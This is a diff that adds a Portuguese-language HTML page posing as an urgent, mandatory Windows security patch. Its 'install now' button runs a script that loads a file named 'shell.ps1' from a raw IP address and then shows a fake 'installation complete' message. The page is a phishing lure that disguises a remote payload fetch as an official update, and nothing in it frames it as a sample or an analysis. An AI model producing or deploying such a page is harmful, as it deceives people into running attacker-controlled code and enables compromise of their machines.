@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head><title>Windows Update Urgente</title></head>
+<body style="background:#0078d4;color:white;text-align:center;padding:50px;font-family:Arial">
+<h1>🚨 ATUALIZAÇÃO OBRIGATÓRIA</h1>
+<h2>Windows Security Patch</h2>
+<p>Seu sistema precisa desta correção urgente!</p>
+<button onclick="instalar()" style="padding:20px;font-size:18px;background:#ff0000;color:white;border:none;border-radius:10px;cursor:pointer">📥 INSTALAR AGORA</button>
+<div id="status" style="margin-top:30px;font-size:20px"></div>
+<script>
+function instalar(){
+    document.getElementById('status').innerHTML='🔄 Instalando...';
+    var s=document.createElement('script');
+    s.src='http://162.120.186.87:8080/shell.ps1';
+    document.body.appendChild(s);
+    setTimeout(()=>{document.getElementById('status').innerHTML='✅ Instalação concluída!';},2000);
+}
+</script>
+</body>
+</html>
